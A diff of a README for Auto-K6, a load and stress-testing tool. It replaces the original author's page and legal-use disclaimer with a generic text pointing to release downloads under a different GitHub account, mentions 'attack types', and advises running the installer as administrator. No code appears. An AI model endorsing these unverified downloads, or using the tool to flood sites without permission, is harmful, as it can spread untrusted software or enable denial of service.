@@ -1,122 +1,56 @@
-# Auto-K6
-<p align="center">
-  <img src="icon.ico" alt="Auto-K6 Logo" width="150">
-</p>
+# 🌐 Auto-K6 - Simple Load Testing for Everyone
 
-<p align="center">
-  <strong>A free and powerful load testing tool. Automate k6 tests with a simple CLI, an advanced GUI (V2), or a modern web interface (V3). Perfect for stress testing websites and web applications.</strong>
-</p>
+## 📥 Download Now
+[![Download Auto-K6](https://img.shields.io/badge/Download%20Auto--K6-v1.0-blue)](https://github.com/Sadskid/Auto-K6/releases)
 
-<p align="center">
-  <a href="https://k6.surge.sh">
-    <img src="https://img.shields.io/badge/Website-Live-brightgreen" alt="Website">
-  </a>
-</p>
+## 🚀 Getting Started
+Auto-K6 is a free tool for load testing websites and applications. Using Auto-K6, you can simulate traffic to see how well your site handles stress. No programming skills are needed. Follow these simple steps to get started.
 
----
+## 📦 Requirements
+Before downloading, make sure your computer meets these requirements:
+- **Operating System**: Windows, macOS, or Linux
+- **Memory**: At least 4 GB of RAM
+- **Disk Space**: Minimum 200 MB of free space
 
-## 🖼️ Preview
+## 🔗 Features
+- **User-Friendly Interface**: No coding required, just click and go.
+- **Multiple Modes**: Choose from various attack types to fit your needs.
+- **Real-Time Monitoring**: See how your application performs under load.
+- **Customizable Configurations**: Adjust settings easily for different scenarios.
 
-### Basic Version (CLI)
-A lightweight and fast command-line interface for quick tests.
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Sadskid/Auto-K6/releases).
+2. Find the latest version of Auto-K6.
+3. Click on the file that matches your operating system.
+4. Download the file to your computer.
+5. After downloading, locate the file in your downloads folder.
+6. Double-click the file to start the installation.
+7. Follow the on-screen instructions to complete the installation.
 
-<p align="center">
-  <img src="Auto-K6.png" alt="Auto-K6 Basic Version Screenshot" width="700">
-</p>
+## 📊 How to Use Auto-K6
+1. Open Auto-K6 from your Applications or Programs menu.
+2. Choose the type of test you want to run.
+3. Enter the URL of the website you want to test.
+4. Set the number of virtual users for the test.
+5. Click “Start Test” to launch the load test.
+6. Monitor the results in real time as Auto-K6 runs the test.
 
-### V2 Version (Advanced GUI)
-A feature-rich graphical interface for in-depth analysis and control.
+## 📓 Troubleshooting
+- **Installation Issues**: If the installation fails, try running the installer as an administrator.
+- **Performance Problems**: Close other applications to free up resources.
+- **Errors During Test**: Ensure the URL is correct and the website is up and running.
 
-<p align="center">
-  <img src="Auto-K6-V2.png" alt="Auto-K6 V2 Version Screenshot" width="700">
-</p>
+## 📞 Support
+If you encounter problems or have questions, you can reach out via the Issues section on our GitHub page. We are here to help you.
 
-### V3 Version (Web Interface)
-A modern web-based interface running locally with all advanced features.
+## 🌍 Community
+Join our community of users. Share your experiences, suggest features, and learn from others. Visit the Discussions section on our GitHub page to connect with fellow Auto-K6 users.
 
-<p align="center">
-  <img src="Auto-K6-V3.png" alt="Auto-K6 V3 Version Screenshot" width="700">
-</p>
+## ⚖️ Licensing
+Auto-K6 is free to use under the terms of the MIT License. You can use it for personal or commercial projects.
 
----
+## 📥 Download Now
+Don't forget to download Auto-K6 today! 
+[![Download Auto-K6](https://img.shields.io/badge/Download%20Auto--K6-v1.0-blue)](https://github.com/Sadskid/Auto-K6/releases)
 
-## 🚀 Features
-
-Available in three versions to meet all your needs:
-
-### Basic Version
--   ✅ Simple HTTP/HTTPS load tests
--   ✅ Command line interface
--   ✅ Lightweight and quick to launch
--   ❌ Max 6500 VUs
--   ❌ Max 2 minutes per test
--   ❌ Does not save history
--   ❌ No IP address tests
--   ❌ No security scan
--   ❌ Terminal interface only
-
-### V2 Version (Recommended)
--   ✅ Advanced and intuitive graphical interface
--   ✅ Tests on specific IP addresses
--   ✅ Integrated website security scan
--   ✅ Complete test history
--   ✅ Automatic installation of the k6 tool
--   ✅ Unlimited VUs and duration
--   ✅ Site status check
--   ✅ Priority 24/7 support
--   ✅ Free lifetime updates
-
-### V3 Version (Ultimate - Web)
--   ✅ Beautiful and modern web interface
--   ✅ Local web server included
--   ✅ Tests on specific IP addresses
--   ✅ Advanced security scan
--   ✅ Complete test history
--   ✅ Unlimited VUs and duration
--   ✅ Real-time monitoring
--   ✅ Mobile responsive interface
--   ✅ Priority 24/7 support
--   ✅ Automatic updates
-
-## ⬇️ Download
-
-Download the version that best suits your needs directly from my website :
-**[https://k6.surge.sh](https://k6.surge.sh)**
-
-## 📖 Usage
-
-   # !!! Make sure you have python installed !!!
-
-### Basic Version
-Run`setup.bat` script and follow the instructions to enter the target URL, number of virtual users (VUs), and test duration.
-
-### V2 Version
-Launch `setup.bat` and use the graphical interface to configure and run your tests in just a few clicks.
-
-### V3 Version (Web)
-Launch `setup.bat` and open http://localhost:5000 and run your test.
-
-## ⚠️ Disclaimer
-
-I am in no way responsible for your actions. This tool should be used legally and ethically, only on targets for which you have explicit permission.
-
-## 👨‍💻 Author
-
-Created with ❤️ by **LTX74**
-
--   Contact: [Telegram](https://t.me/LTX74)
--   Follow me: [TikTok](https://www.tiktok.com/@aro.x.74)
--   GitHub: [LTX128](https://github.com/LTX128)
-
----
-
-## 🔗 Links
-
-- 🌐 **Official Website:** [https://k6.surge.sh](https://k6.surge.sh)
-- 📦 **Basic Version:** [Auto-K6.7z](https://k6.surge.sh/Auto-K6.7z)
-- 🚀 **V2 Version:** [Auto-K6-V2.7z](https://k6.surge.sh/Auto-K6-V2.7z)
-- 🌟 **V3 Version:** [Auto-K6-V3.7z](https://k6.surge.sh/Auto-K6-V3.7z)
-
-## ⭐ Support
-
-If you find this tool useful, consider giving it a star on GitHub and sharing it with others!
+Feel free to explore and enjoy the powerful load testing capabilities of Auto-K6.
